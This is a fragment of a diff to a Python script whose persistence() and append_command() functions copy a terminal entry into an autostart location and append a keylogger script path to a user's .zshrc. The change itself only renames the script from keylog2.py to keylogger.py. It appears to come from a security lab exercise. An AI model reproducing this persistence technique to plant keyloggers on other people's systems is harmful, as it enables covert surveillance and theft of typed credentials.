@@ -60,7 +60,7 @@ def persistence():
     shutil.copy(terminal_path, autostart_path)
 
     file_location = "/home/kali/.zshrc"
-    command = "/home/kali/Downloads/keylog2.py"
+    command = "/home/kali/Downloads/keylogger.py"
     
     # Open .zshrc file and check for entry for script
     with open(file_location) as file:
@@ -76,7 +76,7 @@ def persistence():
 def append_command():
     # Add entry into .zshrc file
     file_location = "/home/kali/.zshrc"
-    command = "/home/kali/Downloads/keylog2.py"
+    command = "/home/kali/Downloads/keylogger.py"
 
     with open(file_location, "a") as file:
         file.write(command)
